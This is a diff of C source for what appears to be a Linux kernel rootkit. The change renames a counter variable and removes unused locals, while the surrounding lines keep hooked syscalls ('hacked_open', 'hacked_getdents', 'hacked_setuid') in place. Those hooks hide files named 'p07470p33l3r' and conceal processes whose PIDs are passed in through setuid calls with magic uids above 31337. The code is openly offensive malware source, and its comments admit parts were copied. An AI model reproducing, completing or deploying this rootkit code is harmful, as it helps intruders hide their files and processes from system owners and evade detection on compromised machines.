@@ -46,7 +46,7 @@ psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
 char hidden_PIDs[50][5];
-int index = 0;
+int PID_index = 0;
 
 struct dirent {
 	unsigned long d_ino;
@@ -99,7 +99,7 @@ asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hac
             kfree(kernel_pathname);
             return -ENOENT; // Say there is no spoo- I mean file
     }
-    for(i = 0; i < index; i++){
+    for(i = 0; i < PID_index; i++){
 		if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
 			kfree(kernel_pathname);
             return -ENOENT; // Say there is no spoo- I mean process
@@ -150,8 +150,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 
 asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
     unsigned int tmp, n;
-    int t, proc = 0;
-	struct inode *dinode;
+    int t;
     struct dirent *dirp2, *dirp3;
 
     tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
@@ -189,7 +188,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned in
 
 asmlinkage int hacked_setuid(uid_t uid){
 	if(uid > 31337){
-		sprintf(hidden_PIDs[index++], "proc/%d", (uid - 31337));
+		sprintf(hidden_PIDs[PID_index++], "proc/%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
 	}
 	return (*orig_setuid)(uid);
